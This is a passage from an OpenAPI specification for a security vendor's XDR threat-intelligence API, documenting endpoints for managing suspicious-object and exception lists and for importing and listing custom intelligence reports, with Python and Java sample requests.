              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-404_Response"
                }
              }
            }
          },
          "500": {
            "description": "Internal error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-500_Response"
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/threatintel/suspiciousObjects/delete'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'data': [\n        {\n            'type': 'YOUR_TYPE (string)',\n            'value': 'YOUR_VALUE (string)'\n        }\n    ]\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/threatintel/suspiciousObjects/delete\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"data\\\": [\" +\n                \"        {\" +\n                \"            \\\"type\\\": \\\"YOUR_TYPE (string)\\\",\" +\n                \"            \\\"value\\\": \\\"YOUR_VALUE (string)\\\"\" +\n                \"        }\" +\n                \"    ]\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/threatintel/suspiciousObjects/exceptions": {
      "get": {
        "summary": "Get Exception List",
        "description": "Retrieves information about domains, file SHA-1 , file SHA-256, IP addresses, email addresses, or URLs that are in the Exception List and displays the information in a paginated list.\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Suspicious Object Management</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Suspicious Object Exception List"
        ],
        "parameters": [
          {
            "name": "skipToken",
            "description": "The skipToken is obtained from the nextLink returned in the previous query, and is used to provide the next page of entries in paginated output.",
            "in": "query",
            "required": false,
            "schema": {
              "type": "string",
              "example": "eyJpZCI6IjI1MGQxMmE3ZDQyMmVhMzhlOGE4OWY4NTJkZDQ0MzQwNTBhNTk4ZjBmMDU3OWU1Y2RiNDI0ZWI5MTgyZTc1YzciLCJjdXN0b21lcl9pZCI6IjFhOGRjODE0LWM2YzgtNGRlMy1hNDE1LTVlNzBjZGIyNzFmYSIsInVwZGF0ZWRfdGltZSI6MTYxMDQ1MDI1MX0="
            }
          },
          {
            "name": "limit",
            "description": "The maximum number of objects returned in paginated output. This value can be a maximum of 1000. If you don't use this parameter, the default is 1000.",
            "in": "query",
            "required": false,
            "schema": {
              "type": "number",
              "example": 100
            }
          },
          {
            "name": "type",
            "description": "The object type, such as \"domain\", \"ip\", \"sha1\", or \"url\". Use a comma to separate multiple values. If you don't use this parameter, the response will include all object types.",
            "in": "query",
            "required": false,
            "schema": {
              "type": "string",
              "example": "ip,sha1"
            }
          }
        ],
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "data": {
                      "description": "Return data",
                      "type": "object",
                      "required": [
                        "exceptionList"
                      ],
                      "properties": {
                        "nextLink": {
                          "type": "string",
                          "description": "The link to the next page for paginated output. This value includes the skiptoken at the end of the link. nextLink will not return if no further pages.",
                          "example": "https://api.xdr.trendmicro.com/v2.0/xdr/threatintel/suspiciousObjects/exceptions?limit=20&skipToken=eyJpZCI6IjI1MGQxMmE3ZDQyMmVhM"
                        },
                        "exceptionList": {
                          "type": "array",
                          "items": {
                            "type": "object",
                            "required": [
                              "type",
                              "value",
                              "lastModified"
                            ],
                            "properties": {
                              "type": {
                                "description": "The object type.",
                                "example": "domain",
                                "type": "string",
                                "enum": [
                                  "domain",
                                  "ip",
                                  "sha1",
                                  "sha256",
                                  "url",
                                  "email_sender"
                                ]
                              },
                              "value": {
                                "description": "The value of the object.",
                                "example": "1.alisiosanguera.com.cn",
                                "type": "string"
                              },
                              "description": {
                                "description": "The description of the object.",
                                "type": "string",
                                "example": "Example object."
                              },
                              "lastModified": {
                                "description": "The time the object was last updated.",
                                "example": "2021-03-22T03:08:40Z",
                                "type": "string"
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            },
            "description": "OK"
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-400_Response"
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-401_Response"
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-403_Response"
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-404_Response"
                }
              }
            }
          },
          "500": {
            "description": "Internal error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-500_Response"
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/threatintel/suspiciousObjects/exceptions'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {\n    'skipToken': 'YOUR_SKIPTOKEN (string)',\n    'limit': 'YOUR_LIMIT (number)',\n    'type': 'YOUR_TYPE (string)'\n}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/threatintel/suspiciousObjects/exceptions\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addParameter(\"skipToken\", \"YOUR_SKIPTOKEN (string)\")\n                .addParameter(\"limit\", \"YOUR_LIMIT (number)\")\n                .addParameter(\"type\", \"YOUR_TYPE (string)\")\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "post": {
        "summary": "Add objects to Exception List",
        "description": "Adds domains, file SHA-1 , file SHA-256, IP addresses, email addresses, or URLs to the Exception List and prevents these objects from being added to the Suspicious Object List\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Suspicious Object Management</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n    <li>Manage lists and configure settings</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Suspicious Object Exception List"
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "required": [
                  "data"
                ],
                "properties": {
                  "data": {
                    "description": "The object to be added to the Exception List.",
                    "type": "array",
                    "items": {
                      "type": "object",
                      "required": [
                        "type",
                        "value"
                      ],
                      "properties": {
                        "type": {
                          "description": "Object record type.",
                          "example": "domain",
                          "type": "string",
                          "enum": [
                            "domain",
                            "ip",
                            "sha1",
                            "sha256",
                            "url",
                            "email_sender"
                          ]
                        },
                        "value": {
                          "description": "The object value. Full and partial matches supported.<br/>\nDomain partial match with a wildcard as the subdomain: *.example.com <br/>\nIP partial match: 200.102.35.1-200.102.35.254, 200.102.35.1/24 <br/>\nURL partial match with wildcards: http://. or https://. at the beginning, * at the end, and multiple wildcards such as https:// *.example.com/path1/ * <br/>\nFile SHA-1, file SHA-256, email addresses: Full match only\n",
                          "example": "1.alisiosanguera.com.cn",
                          "type": "string"
                        },
                        "description": {
                          "description": "Exception description.",
                          "type": "string",
                          "example": "Example object added as to the Exception List."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "data": {
                      "description": "Return data",
                      "type": "object",
                      "properties": {}
                    }
                  }
                }
              }
            },
            "description": "OK"
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-400_SET_Response"
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-401_Response"
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-403_Response"
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-404_Response"
                }
              }
            }
          },
          "500": {
            "description": "Internal error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-500_Response"
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/threatintel/suspiciousObjects/exceptions'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'data': [\n        {\n            'type': 'YOUR_TYPE (string)',\n            'value': 'YOUR_VALUE (string)',\n            'description': 'YOUR_DESCRIPTION (string)'\n        }\n    ]\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/threatintel/suspiciousObjects/exceptions\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"data\\\": [\" +\n                \"        {\" +\n                \"            \\\"type\\\": \\\"YOUR_TYPE (string)\\\",\" +\n                \"            \\\"value\\\": \\\"YOUR_VALUE (string)\\\",\" +\n                \"            \\\"description\\\": \\\"YOUR_DESCRIPTION (string)\\\"\" +\n                \"        }\" +\n                \"    ]\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/threatintel/suspiciousObjects/exceptions/delete": {
      "post": {
        "summary": "Delete objects from Exception List",
        "description": "Deletes domains, file SHA-1 , file SHA-256, IP addresses, email addresses, or URLs from the Exception List.\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Suspicious Object Management</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n    <li>Manage lists and configure settings</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Suspicious Object Exception List"
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "required": [
                  "data"
                ],
                "properties": {
                  "data": {
                    "description": "The object to be deleted from the Exception List.",
                    "type": "array",
                    "items": {
                      "type": "object",
                      "required": [
                        "type",
                        "value"
                      ],
                      "properties": {
                        "type": {
                          "description": "The object type.",
                          "example": "domain",
                          "type": "string",
                          "enum": [
                            "domain",
                            "ip",
                            "sha1",
                            "sha256",
                            "url",
                            "email_sender"
                          ]
                        },
                        "value": {
                          "description": "The object value.",
                          "example": "1.alisiosanguera.com.cn",
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "data": {
                      "description": "Return data",
                      "type": "object",
                      "properties": {}
                    }
                  }
                }
              }
            },
            "description": "OK"
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-400_SET_Response"
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-401_Response"
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-403_Response"
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-404_Response"
                }
              }
            }
          },
          "500": {
            "description": "Internal error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-500_Response"
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/threatintel/suspiciousObjects/exceptions/delete'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'data': [\n        {\n            'type': 'YOUR_TYPE (string)',\n            'value': 'YOUR_VALUE (string)'\n        }\n    ]\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/threatintel/suspiciousObjects/exceptions/delete\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"data\\\": [\" +\n                \"        {\" +\n                \"            \\\"type\\\": \\\"YOUR_TYPE (string)\\\",\" +\n                \"            \\\"value\\\": \\\"YOUR_VALUE (string)\\\"\" +\n                \"        }\" +\n                \"    ]\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/threatintel/intelligenceReports": {
      "post": {
        "summary": "Import STIX and CSV files as custom intelligence reports",
        "description": "Imports STIX and CSV files as custom intelligence reports that you can use to trigger sweeping tasks\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Intelligence Reports</b><br>\n  <ul>\n    <li>View, filter, search</li>\n    <li>Add/delete custom reports</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Intelligence Reports"
        ],
        "requestBody": {
          "content": {
            "multipart/form-data": {
              "schema": {
                "type": "object",
                "required": [
                  "file",
                  "reportName",
                  "fileName",
                  "format"
                ],
                "properties": {
                  "file": {
                    "description": "File to be imported, encoded in UTF-8",
                    "type": "string",
                    "format": "binary"
                  },
                  "format": {
                    "description": "Format of file to be imported. Possible values: \"stix\" and \"csv\"",
                    "type": "string"
                  },
                  "reportName": {
                    "description": "Name of a custom intelligence report. When importing STIX files, leave this field blank because the system assigns a report name using predefined STIX attributes.",
                    "type": "string"
                  },
                  "fileName": {
                    "description": "File name of a custom intelligence report",
                    "type": "string"
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "data": {
                      "description": "Retrieved data",
                      "type": "object",
                      "required": [
                        "uploadStatus",
                        "extractReportList"
                      ],
                      "properties": {
                        "uploadStatus": {
                          "type": "string",
                          "description": "File import status. Possible values: \"success\" and \"failed\"",
                          "example": "success"
                        },
                        "extractReportList": {
                          "type": "array",
                          "items": {
                            "type": "string",
                            "description": "Unique alphanumeric string that identifies aÂ custom intelligence report",
                            "example": "report--2c1091ba-a7d2-46b2-bf97-4137916c30cb"
                          }
                        }
                      }
                    }
                  }
                }
              }
            },
            "description": "OK"
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-400_Response"
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-401_Response"
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-403_Response"
                }
              }
            }
          },
          "500": {
            "description": "Internal error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-500_Response"
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/threatintel/intelligenceReports'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\ndata = {\n    'format': 'YOUR_FORMAT (string)',\n    'reportName': 'YOUR_REPORTNAME (string)',\n    'fileName': 'YOUR_FILENAME (string)'\n}\nfiles = {\n    'file': ('YOUR_FILENAME (string)', open('YOUR_FILEPATH (string)', 'rb'), 'YOUR_MIMETYPE (string)')\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, data=data, files=files)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.File;\nimport java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.entity.mime.MultipartEntityBuilder;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/threatintel/intelligenceReports\";\n        String token = \"YOUR_TOKEN\";\n\n        HttpEntity multipartEntity = MultipartEntityBuilder.create()\n                .setContentType(ContentType.MULTIPART_FORM_DATA)\n                .addTextBody(\"format\", \"YOUR_FORMAT (string)\")\n                .addTextBody(\"reportName\", \"YOUR_REPORTNAME (string)\")\n                .addTextBody(\"fileName\", \"YOUR_FILENAME (string)\")\n                .addBinaryBody(\"file\", new File(\"YOUR_FILEPATH (string)\"), ContentType.create(\"YOUR_MIMETYPE (string)\"), \"YOUR_FILENAME (string)\")\n                .build();\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .setEntity(multipartEntity)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "get": {
        "parameters": [
          {
            "name": "startTime",
            "description": "Timestamp (\"updatedTime\") that indicates the start of the data retrieval time range. If not specified, the request retrieves all available custom intelligence reports.",
            "in": "query",
            "required": false,
            "schema": {
              "type": "string",
              "example": "2021-03-22T03:08:40Z"
            }
          }
        ],
        "summary": "List custom intelligence reports",
        "description": "Retrieves a list of custom intelligence reports created from imported or retrieved data\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Intelligence Reports</b><br>\n  <ul>\n    <li>View, filter, search</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Intelligence Reports"
        ],
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "data": {
                      "description": "Retrieved data",
                      "type": "array",
                      "items": {
                        "type": "object",
                        "properties": {
                          "id": {
                            "type": "string",
                            "description": "Unique alphanumeric string that identifies a custom intelligence report",
                            "example": "report--2c1091ba-a7d2-46b2-bf97-4137916c30cb"
                          },
                          "name": {
                            "type": "string",
                            "description": "Title of a custom intelligence report",
                            "example": "Report Name 1"
                          },
                          "updatedTime": {
                            "type": "string",
                            "description": "Timestamp that indicates when a custom intelligence report was last updated",
                            "example": "2021-03-22T03:08:40Z"
                          }
                        }
                      }
                    }
                  }
                }
              }
            },
            "description": "OK"
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-400_Response"
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
